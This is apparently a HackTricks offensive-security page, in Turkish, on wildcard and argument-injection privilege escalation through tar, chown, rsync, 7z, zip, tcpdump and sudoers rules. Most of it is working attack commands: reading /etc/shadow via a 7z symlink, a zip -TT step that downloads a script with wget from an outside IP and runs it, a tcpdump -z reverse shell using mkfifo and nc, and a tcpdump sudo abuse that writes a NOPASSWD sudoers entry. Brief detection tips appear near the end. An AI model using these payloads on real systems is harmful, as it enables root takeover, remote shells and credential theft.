# Wildcards İçin Ek Hileler

> Wildcard (diğer adıyla *glob*) **argument injection**, ayrıcalıklı bir script’in `tar`, `chown`, `rsync`, `zip`, `7z`, … gibi bir Unix binary’sini `*` gibi tırnak içine alınmamış bir wildcard ile çalıştırması durumunda gerçekleşir.
> Shell, wildcard’ı binary çalıştırılmadan **önce** genişlettiğinden, çalışma dizininde dosya oluşturabilen bir attacker, `-` ile başlayan dosya adları hazırlayabilir; böylece bunlar **veri yerine option** olarak yorumlanır ve keyfi flag’ler, hatta komutlar gizlice aktarılabilir.<sup>[[6]](#references)</sup>
> Bu sayfa, 2023-2025 dönemi için en kullanışlı primitive’leri, güncel araştırmaları ve modern detection yöntemlerini bir araya getirir.

## chown / chmod

Bir wildcard genişletildiğinde option gibi görünen bir dosya adının `--reference` flag’ini kötüye kullanarak **owner/group bilgisini veya permission bit’lerini bir reference file’dan kopyalayabilirsiniz**.<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>
```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```
root daha sonra şuna benzer bir şey çalıştırdığında:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
Genişletilmiş `--reference=.drf.php`, açıkça belirtilen owner/mode değerlerini geçersiz kılarak eşleşen dosyaların metadata'yı `.drf.php` dosyasından devralmasına neden olur (ve yukarıdaki kurulumla bunları attacker tarafından yazılabilir hâle getirir).<sup>[[6]](#references)</sup>

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).<sup>[[7]](#references)</sup>
Ayrıntılar için klasik DefenseCode makalesine de bakın.<sup>[[6]](#references)</sup>

---

## tar

### GNU tar

GNU tar'ın **checkpoint** özelliğini ve checkpoint actions özelliğini kötüye kullanarak arbitrary commands çalıştırın.<sup>[[10]](#references)</sup>
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```
Root, örneğin `tar -czf /root/backup.tgz *` komutunu çalıştırdığında `shell.sh`, root olarak çalıştırılır.<sup>[[10]](#references)</sup>

### bsdtar / macOS compressor override uyarısı

Yakın tarihli macOS sürümlerindeki (`libarchive` tabanlı) varsayılan `tar`, GNU tar'ın `--checkpoint` arayüzünü sağlamaz; ancak bsdtar, harici bir compressor seçmek için **--use-compress-program** seçeneğini belgeler.<sup>[[11]](#references)</sup>
```bash
# macOS example
touch -- "--use-compress-program=sh"
```
Ayrıcalıklı bir script `tar -cf backup.tar *` çalıştırdığında, bu işlem kurbanın `PATH` değeri üzerinden `sh` dosyasını seçer ve bsdtar onu compressor olarak başlatır.<sup>[[11]](#references)</sup> Bu, option injection durumunu kanıtlar; ancak tek başına güvenilir bir arbitrary-command primitive değildir: wildcard tarafından oluşturulan bir dosya adı `/` içeremez ve bsdtar, saldırganın seçtiği bir shell command yerine arşiv verisi sağlar. Code execution için ayrıca `PATH` üzerinden çözümlenen veya kullanışlı bir programı adlandırabilen başka bir argument channel aracılığıyla kontrol edilebilen bir executable gerekir.

---

## rsync

`rsync`, `-e` ve `--rsync-path` gibi command-line flag'leri aracılığıyla remote shell'i veya remote binary'yi override etmenize olanak tanır.<sup>[[12]](#references)</sup>
```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Root daha sonra dizini `rsync -az * backup:/srv/` ile arşivlerse, enjekte edilen flag remote-shell mekanizması üzerinden bir shell çalıştırabilir.<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` modu).

---

## 7-Zip / 7z / 7za

Privileged script, option parsing'i durdurmak için wildcard'ın önüne savunma amaçlı olarak `--` eklese bile 7-Zip CLI, dosya adının başına `@` eklenerek **file list files** kabul eder. Bunu bir symlink ile birleştirmek, *arbitrary files* exfiltrate etmenizi sağlar.<sup>[[13]](#references)</sup>
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
root şuna benzer bir şey çalıştırırsa:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip, `root.txt` dosyasını (`→ /etc/shadow`) bir dosya listesi olarak okumaya çalışır ve işlemi sonlandırır; **içeriği stderr'e yazdırır**.<sup>[[13]](#references)</sup>

Bu durum `-- *` ile de çalışır; çünkü 7-Zip CLI, konumsal girdiler olarak hem normal dosya adlarını hem de `@listfiles` ifadelerini açıkça kabul eder. Bu nedenle `@root.txt` gibi gerçek bir dosya adı yine özel olarak işlenir.<sup>[[13]](#references)</sup>

---

## zip

Bir uygulama, kullanıcı tarafından kontrol edilen dosya adlarını `zip` komutuna (bir wildcard aracılığıyla veya `--` kullanmadan adları listeleyerek) aktardığında iki oldukça pratik primitive kullanılabilir.<sup>[[2]](#references)[[3]](#references)</sup>

- RCE via test hook: `-T`, “test archive” özelliğini etkinleştirir ve `-TT <cmd>`, tester'ı rastgele bir programla değiştirir (uzun biçimi: `--unzip-command <cmd>`). `-` ile başlayan dosya adlarını inject edebiliyorsanız, short-options parsing'in çalışması için flag'leri farklı dosya adlarına bölün.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Notlar
- `'-T -TT <cmd>'` gibi tek bir filename kullanmayı DENEMEYİN — short options karakter başına ayrıştırılır ve başarısız olur. Aşağıda gösterildiği gibi ayrı token'lar kullanın.<sup>[[3]](#references)</sup>
- Uygulama filename'lerdeki slash karakterlerini kaldırıyorsa, bare host/IP üzerinden (varsayılan path `/index.html`) fetch edin, `-O` ile yerel olarak kaydedin ve ardından execute edin.<sup>[[3]](#references)</sup>
- Token'larınızın nasıl tüketildiğini anlamak için ayrıştırmayı `-sc` (işlenmiş argv'yi gösterir) veya `-h2` (daha fazla yardım) ile debug edebilirsiniz.<sup>[[3]](#references)</sup>

zip 3.0 üzerindeki local behavior örneği.<sup>[[3]](#references)</sup>
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Web katmanı `zip` stdout/stderr çıktısını yansıtıyorsa (naive wrapper'larda yaygındır), `--help` gibi enjekte edilen flag'ler veya hatalı option'lardan kaynaklanan failures HTTP response içinde görünür; bu da command-line injection'ı doğrular ve payload tuning'e yardımcı olur.<sup>[[3]](#references)</sup>

---

## Ek option-injection adayları

Privileged bir wrapper writable bir directory'yi wildcard ile genişlettiğinde, bu belgelenmiş option hook'larını kontrol etmeye değer.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `flock` | `-c <cmd>` | Bir command string'i shell'e iletir |
| `git`   | `-c core.sshCommand=<cmd>` | Git fetch/push için SSH yerine `<cmd>` kullanır |
| `scp`   | `-S <program>` | Alternatif bir SSH-compatible connection program kullanır |

Bu primitive'ler klasik *tar/rsync/zip* kontrollerinin ötesinde useful checks sağlar.

---

## Vulnerable wrapper'ları ve job'ları arama

Güncel case study'ler ve detection guidance, wildcard/argv injection'ın artık yalnızca **cron + tar** problemi olmadığını gösteriyor.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> Aynı bug class şu alanlarda da görülmeye devam ediyor:

- attacker-controlled upload directory'lerinden "everything as zip/tar" indiren web feature'ları
- attacker-controlled filename/filter field'larını açığa çıkaran **tcpdump** wrapper'larına sahip vendor/appliance debug shell'leri
- writable directory'lerde `tar`, `rsync`, `7z`, `zip`, `chown` veya `chmod` çağıran backup ya da rotation job'ları

Useful triage command'ları (`pspy` invocation'ı, belgelenmiş process/file-event ve interval flag'lerini kullanır).<sup>[[14]](#references)</sup>
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Hızlı sezgisel kurallar:

- `-- *`, birçok GNU aracı için iyi bir çözümdür; ancak `@listfiles` ayrı olarak ayrıştırıldığı için `7z`/`7za` için **değildir**.<sup>[[13]](#references)</sup>
- `zip` için, kullanıcı tarafından kontrol edilen dosya adlarını doğrudan enumerate eden wrapper'ları arayın; kısa seçeneklerin ayrıştırılması (`-T` + `-TT <cmd>`), shell glob olmadan da çalışır.<sup>[[2]](#references)[[3]](#references)</sup>
- `tcpdump` için, **çıktı dosyası adlarını**, **rotation ayarlarını** veya **capture-file replay** argümanlarını kontrol etmenize izin veren wrapper'lara özellikle dikkat edin.<sup>[[18]](#references)</sup>

---

## tcpdump rotation hooks (-G/-W/-z): wrapper'larda argv injection üzerinden RCE

Kısıtlı bir shell veya vendor wrapper, kullanıcı tarafından kontrol edilen alanları (ör. bir "file name" parametresi) katı quoting/validation uygulamadan birleştirerek `tcpdump` command line oluşturduğunda, fazladan `tcpdump` flag'leri gizlice aktarabilirsiniz. `-G` (time-based rotation), `-W` (dosya sayısını sınırlar) ve `-z <cmd>` (post-rotate command) birleşimi, `tcpdump`'ı çalıştıran kullanıcı olarak (appliance'larda genellikle root) arbitrary command execution sağlar.<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

Ön koşullar:

- `tcpdump`'a aktarılan `argv` değerlerini etkileyebiliyorsunuz (ör. `/debug/tcpdump --filter=... --file-name=<HERE>` gibi bir wrapper aracılığıyla).<sup>[[4]](#references)[[18]](#references)</sup>
- Wrapper, file name alanındaki boşlukları veya `-` ile başlayan token'ları sanitize etmiyor.<sup>[[4]](#references)</sup>

Klasik PoC (writable bir path'teki reverse shell script'ini çalıştırır).<sup>[[4]](#references)[[18]](#references)</sup>
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Ayrıntılar:

- `-G 1` her saniye döndürür ve `-W 1` bir döndürülmüş dosyadan sonra durur; capture işlemi döndürme gerçekleşmeden önce eşleşen bir paket almalıdır.<sup>[[18]](#references)</sup>
- `-z <cmd>` her döndürme işleminden sonra komutu bir kez çalıştırır ve kapatılan savefile yolunu argüman olarak iletir; script/interpreter argüman işlemesinin payload'unuzla eşleştiğinden emin olun.<sup>[[18]](#references)</sup>

Çıkarılabilir medya gerektirmeyen varyantlar:

- Dosya yazmak için başka bir primitive'iniz varsa (ör. output redirection'a izin veren ayrı bir command wrapper), script'inizi bilinen bir yola bırakın ve `-z /path/script.sh` komutunu tetikleyin; gerekirse script'in kendisi `/bin/sh` çağırmalıdır.<sup>[[18]](#references)</sup>
- Bir vendor wrapper, döndürülmüş yolu seçmenize izin veriyorsa bu yol kontrolünü yalnızca savefile argümanını yorumlayan bir post-rotate command ile birlikte denetleyin; tek başına yol kontrolü dosya içeriğini çalıştırmaz.<sup>[[18]](#references)</sup>

---

## sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root

Örnek sudoers anti-pattern:<sup>[[3]](#references)</sup>
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Kural, tcpdump'un belgelenmiş parser'ı altında çeşitli seçenekleri kullanılabilir bırakır:<sup>[[3]](#references)[[18]](#references)</sup>
- `*` glob'u ve izin verici pattern'ler yalnızca ilk `-w` argümanını sınırlar. `tcpdump` birden fazla `-w` seçeneğini kabul eder; sonuncusu geçerli olur.<sup>[[3]](#references)[[18]](#references)</sup>
- Kural diğer seçenekleri sınırlandırmadığından `-Z`, `-r`, `-V` vb. seçeneklere izin verilir.<sup>[[3]](#references)[[18]](#references)</sup>

İlgili primitive'ler aşağıda belgelenmiştir.<sup>[[3]](#references)[[18]](#references)</sup>
- İkinci bir `-w` ile hedef path'i override edin (ilki yalnızca sudoers koşulunu karşılar).<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Kısıtlanmış ağaçtan kaçmak için ilk `-w` içindeki path traversal.<sup>[[3]](#references)</sup>
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- `-Z root` ile çıktı sahipliğini zorlayın (her yerde root sahipli dosyalar oluşturur).<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- `-r` aracılığıyla hazırlanmış bir PCAP'i yeniden oynatarak rastgele içerik yazma (ör. bir sudoers satırı bırakmak).<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>Tam ASCII payload'ı içeren bir PCAP oluşturun ve bunu root olarak yazın</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- `-V <file>` ile arbitrary file read/secret leak (bir savefiles listesini yorumlar). Error diagnostics çoğu zaman satırları echo ederek içeriği leak eder.<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Tam Exploit Zinciri](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Wildcard Injection Yoluyla Olası Shell Tespit Edildi](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Geleceğe Dönüş: Unix Wildcard'ları Çığrından Çıktı (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [GNU Coreutils `chown` kullanımı](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [GNU Coreutils `chmod` kullanımı](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [GNU tar checkpoint'leri](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [bsdtar(1) kılavuzu](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [rsync(1) kılavuzu](https://download.samba.org/pub/rsync/rsync.1)
- [13] [7-Zip komut satırı söz dizimi](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [flock(1) kılavuzu](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Git yapılandırma belgeleri](https://git-scm.com/docs/git-config)
- [17] [OpenBSD `scp` kılavuzu](https://man.openbsd.org/scp)
- [18] [tcpdump(8) kılavuzu](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
